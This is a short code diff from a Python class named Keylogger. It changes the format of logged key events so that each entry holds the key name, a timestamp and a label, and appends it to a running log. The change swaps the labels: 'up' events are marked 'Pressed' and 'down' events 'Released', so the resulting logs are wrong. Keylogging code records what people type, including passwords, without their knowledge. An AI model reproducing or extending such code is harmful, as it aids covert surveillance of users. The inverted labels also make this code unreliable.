@@ -48,12 +48,12 @@ class Keylogger:
         print(f"current letter: {Keylogger.current_letter} ")
 
         if eventtype == "up":
-            name = "\n" + "up," + name + "," + str(now)
+            name = "\n" + name + " " + str(now) + " Pressed"
         elif eventtype == "down" and Keylogger.current_letter != name:
             Keylogger.current_letter = name
             print(f"name: {name}")
             letter = name[0]
-            name = "\n" + "down," + name + "," + str(now)
+            name = "\n" + name + " " + str(now) + " Released"
 
         # finally, add the key name to our global `self.log` variable
         self.log += name
